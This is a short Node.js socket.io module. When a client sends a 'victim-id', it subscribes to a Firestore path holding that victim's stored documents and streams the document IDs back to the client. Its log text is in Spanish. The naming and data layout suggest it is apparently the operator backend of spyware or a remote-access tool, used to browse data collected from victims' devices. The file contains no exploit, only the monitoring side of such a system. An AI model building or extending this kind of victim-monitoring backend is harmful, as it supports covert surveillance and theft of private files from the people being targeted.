const database = require("../../database/index")

module.exports = io =>{
    io.on("connection", (socket) =>{
        console.log("Alguien se conecto con sockets documentos");


        socket.on("victim-id", (victim_id) =>{
            
            database.collection("users").doc(victim_id).collection("data").doc("storage").collection("documents").onSnapshot(documents =>{
                const data_documents = documents.docs.map((doc) =>({ id: doc.id }))
                socket.emit("documents", data_documents)
            })

        })

    })

}